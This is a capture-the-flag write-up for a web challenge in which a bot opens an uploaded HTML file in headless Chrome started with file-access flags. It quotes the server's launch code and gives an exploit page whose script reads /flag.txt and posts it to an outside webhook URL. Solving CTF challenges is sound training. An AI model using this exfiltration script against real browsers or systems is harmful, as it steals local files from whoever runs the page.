# Description

I heard you like flags, so I launched Chrome with a lot of flags so you can get your flag!
The flag is in `/flag.txt`, and the bot will visit the HTML file you uploaded!

# Solution

The basic idea of the challenge was that you could run your code inside google chrome with bunch of flags enabled. 
One of the flags was `--allow-file-access-from-files`, which we can use to get the contents of the flag file.
Lets take a look at how the server processes our request:

```javascript
app.post('/submit', upload.single('htmlFile'), (req, res) => {

  console.log(req.file);
  const { filename, path: filePath } = req.file;

  if (!filename || !filePath) {
    return res.status(400).send('No file uploaded');
  }

  const userDir = '/tmp/chrome-user-data-dir-' + Math.random().toString(36).substring(7);
  // Don't even try to remove --headless, everything will break. If you want to try stuff, use --remote-debugging-port and disable all other remote debugging flags.
  const command = `bash -c "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run ${flags} ${filePath}"`;

  res.send('File uploaded and processed successfully. Launched Chrome:<br><br>' + command);
```

This is a classic XSS where we need to upload a malicious html page, which gets the contents of the file and returns it back to us.
I have made a `exploit.html` file which does that for us:
```javascript
<script>
    fetch("/flag.txt")
        .then(response => response.text())
        .then(text => {
            fetch("https://webhook-test.com/570a3259252e5b612d7913b245f166d6", {
                method: "POST",
                body: text
            });
        });
</script>
```

First, it reads the flag file and sends a POST request to [webhook-test](https://webhook.site/), where you can inspect incoming HTTP requests.
After we upload the file we can inspect the webhook site and get the flag:
<img width="143" alt="Untitled" src="https://github.com/AdamZvara/CTF/assets/36104483/2507f769-5699-4d06-a6de-08e6b2e0a23b">
